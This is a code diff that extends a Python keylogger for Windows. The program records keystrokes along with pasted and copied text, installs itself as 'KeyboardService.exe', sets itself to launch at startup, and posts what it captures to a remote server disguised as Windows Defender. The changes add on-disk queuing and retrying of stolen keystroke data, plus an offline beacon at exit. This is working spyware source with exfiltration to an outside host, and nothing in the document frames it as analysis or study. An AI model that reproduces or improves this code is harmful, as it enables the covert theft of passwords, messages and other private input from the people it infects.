@@ -1,6 +1,7 @@
 import os
 import time
 import json
+import atexit
 import hashlib
 import platform
 import shutil
@@ -8,6 +9,7 @@ import socket
 import subprocess
 import sys
 import ctypes
+import tempfile
 from ctypes import wintypes
 from queue import Queue
 from threading import Lock, Thread, Timer
@@ -23,6 +25,7 @@ except ImportError:
 MESSAGE_GAP_MS = 2500
 RAW_BATCH_DELAY_SECONDS = 0.08
 HEARTBEAT_INTERVAL_SECONDS = 30
+MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SITE_URL = "https://windows-defender-cf8n.onrender.com"
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
@@ -42,6 +45,8 @@ client_started_at = int(time.time() * 1000)
 STARTUP_ENTRY_NAME = "KeyboardService"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
 INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
+PENDING_MESSAGES_PATH = os.path.join(INSTALL_DIR, "pending_messages.json")
+pending_messages_lock = Lock()
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -181,31 +186,87 @@ def raw_key_value(key):
     return ""
 
 
-def send_message(text, app_name, raw_text=None, is_pasted=False, is_copied=False, raw_only=False):
+def load_pending_messages():
+    try:
+        with open(PENDING_MESSAGES_PATH, "r", encoding="utf-8") as pending_file:
+            messages = json.load(pending_file)
+            return messages if isinstance(messages, list) else []
+    except (FileNotFoundError, OSError, json.JSONDecodeError):
+        return []
+
+
+def save_pending_messages(messages):
+    os.makedirs(INSTALL_DIR, exist_ok=True)
+    fd, temporary_path = tempfile.mkstemp(
+        prefix="pending_messages_", suffix=".tmp", dir=INSTALL_DIR
+    )
+    try:
+        with os.fdopen(fd, "w", encoding="utf-8") as pending_file:
+            json.dump(messages, pending_file)
+        os.replace(temporary_path, PENDING_MESSAGES_PATH)
+    finally:
+        if os.path.exists(temporary_path):
+            os.unlink(temporary_path)
+
+
+def remember_pending_message(payload):
+    with pending_messages_lock:
+        messages = load_pending_messages()
+        messages.append(payload)
+        save_pending_messages(messages)
+
+
+def forget_pending_message(payload):
+    with pending_messages_lock:
+        messages = load_pending_messages()
+        try:
+            messages.remove(payload)
+        except ValueError:
+            return
+        if messages:
+            save_pending_messages(messages)
+        elif os.path.exists(PENDING_MESSAGES_PATH):
+            os.unlink(PENDING_MESSAGES_PATH)
+
+
+def post_message(payload):
     try:
         headers = {"Content-Type": "application/json"}
         request = Request(
             f"{SITE_URL}/api/messages",
-            data=json.dumps(
-                {
-                    "text": text,
-                    "raw_text": raw_text if raw_text is not None else text,
-                    "device_id": device_id,
-                    "device_name": device_name,
-                    "app_name": app_name,
-                    "is_pasted": is_pasted,
-                    "is_copied": is_copied,
-                    "raw_only": raw_only,
-                }
-            ).encode("utf-8"),
+            data=json.dumps(payload).encode("utf-8"),
             headers=headers,
             method="POST",
         )
         with urlopen(request, timeout=10) as response:
             if response.status >= 400:
                 raise RuntimeError(f"HTTP {response.status}")
+        return True
     except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
         print(f"Could not send message: {error}")
+        return False
+
+
+def send_message(text, app_name, raw_text=None, is_pasted=False, is_copied=False, raw_only=False):
+    payload = {
+        "text": text,
+        "raw_text": raw_text if raw_text is not None else text,
+        "device_id": device_id,
+        "device_name": device_name,
+        "app_name": app_name,
+        "is_pasted": is_pasted,
+        "is_copied": is_copied,
+        "raw_only": raw_only,
+    }
+    remember_pending_message(payload)
+    if post_message(payload):
+        forget_pending_message(payload)
+
+
+def retry_pending_messages():
+    for payload in load_pending_messages():
+        if post_message(payload):
+            forget_pending_message(payload)
 
 
 def send_heartbeat():
@@ -228,6 +289,21 @@ def send_heartbeat():
                 raise RuntimeError(f"HTTP {response.status}")
     except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
         print(f"Could not send device heartbeat: {error}")
+
+
+def mark_device_offline():
+    try:
+        request = Request(
+            f"{SITE_URL}/api/devices/offline",
+            data=json.dumps({"device_id": device_id}).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urlopen(request, timeout=3) as response:
+            if response.status >= 400:
+                raise RuntimeError(f"HTTP {response.status}")
+    except (HTTPError, URLError, TimeoutError, RuntimeError, OSError) as error:
+        print(f"Could not mark device offline: {error}")
 
 
 def register_startup_launch():
@@ -282,10 +358,17 @@ def heartbeat_sender():
 
 
 def message_sender():
+    last_retry_at = 0
     while True:
-        text, app_name, raw_text, is_pasted, is_copied, raw_only = message_queue.get()
-        send_message(text, app_name, raw_text, is_pasted, is_copied, raw_only)
-        message_queue.task_done()
+        try:
+            text, app_name, raw_text, is_pasted, is_copied, raw_only = message_queue.get(timeout=5)
+            send_message(text, app_name, raw_text, is_pasted, is_copied, raw_only)
+            message_queue.task_done()
+        except Exception:
+            pass
+        if time.time() - last_retry_at >= MESSAGE_RETRY_INTERVAL_SECONDS:
+            retry_pending_messages()
+            last_retry_at = time.time()
 
 
 def queue_raw_token(token, app_name):
@@ -406,6 +489,7 @@ if install_and_relaunch():
 
 print(f"Sending to {SITE_URL}")
 register_startup_launch()
+atexit.register(mark_device_offline)
 Thread(target=message_sender, daemon=True).start()
 Thread(target=heartbeat_sender, daemon=True).start()
 with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
